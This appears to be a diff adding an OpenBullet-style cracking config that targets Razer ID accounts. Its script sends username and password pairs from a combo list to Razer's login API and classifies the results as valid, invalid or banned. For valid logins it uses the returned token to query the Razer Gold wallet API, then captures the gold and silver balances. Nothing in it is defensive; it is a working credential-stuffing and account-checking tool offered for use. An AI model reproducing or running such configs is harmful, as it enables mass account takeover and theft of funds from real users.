@@ -1,0 +1,105 @@
+[SETTINGS]
+{
+  "Name": "razer",
+  "SuggestedBots": 35,
+  "MaxCPM": 0,
+  "LastModified": "2021-02-24T08:23:09.3656838-08:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://id.razer.com/api/emily/7/login/get" 
+  CONTENT "{\"data\":\"<COP><User><password><PASS></password><email><USER></email></User><ServiceCode>0280</ServiceCode></COP>\",\"clientId\":\"cec0482b1b77d46ab7f13b114e79ae3b3c01286d\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: id.razer.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Origin: https://id.razer.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.79 Safari/537.36" 
+  HEADER "Content-Type: application/json;charset=UTF-8" 
+  HEADER "Referer: https://id.razer.com/" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY ">Invalid Login" 
+    KEY ">Invalid Email<" 
+  KEYCHAIN Success AND 
+    KEY ">valid username and password</" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY ">Consent required</" 
+  KEYCHAIN Ban OR 
+    KEY "consecutive failed login attempts</" 
+
+PARSE "<SOURCE>" LR "><User><ID>" "</" -> VAR "rid" 
+
+PARSE "<SOURCE>" LR "ID><Token>" "</" -> VAR "rid2" 
+
+REQUEST GET "https://silverapi.gold.razer.com/?razerid=<rid>" AutoRedirect=FALSE 
+  
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Authorization: Bearer <rid2>" 
+  HEADER "User-Agent: RazerNatasha/7.3.30.156 (Windows NT 10.0; Win64; x32) GameBooster2/9.11.9.1287" 
+  HEADER "Host: silverapi.gold.razer.com" 
+
+#GoldWallet PARSE "<SOURCE>" LR "{\"GoldWallet\": {\"GoldBalance\": " "," -> VAR "ZERO" 
+
+#SilverBalance PARSE "<SOURCE>" LR "{\"SilverBalance\": " "," -> VAR "SilverBalance" 
+
+#Currency PARSE "<SOURCE>" LR "\"CurrencyCode\": \"" "\"," -> VAR "CurrencyCode" 
+
+KEYCHECK BanOn4XX=TRUE 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "{\"GoldBalance\": 0" 
+    KEY "{\"SilverBalance\": 0" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "SilverBalance\": 0" 
+    KEY "<SOURCE>" DoesNotContain "GoldBalance\": 0" 
+  KEYCHAIN Failure OR 
+    KEY "{\"GoldWallet\": {}, \"SilverWallet\": {}}" 
+    KEY "{\"GoldWallet\": {}, \"SilverWallet\": {\"SilverBalance\": 0" 
+
+#final FUNCTION Constant "🥇GoldWallet: <ZERO>       🥈SilverBalance: <SilverBalance>" -> CAP "final" 
+
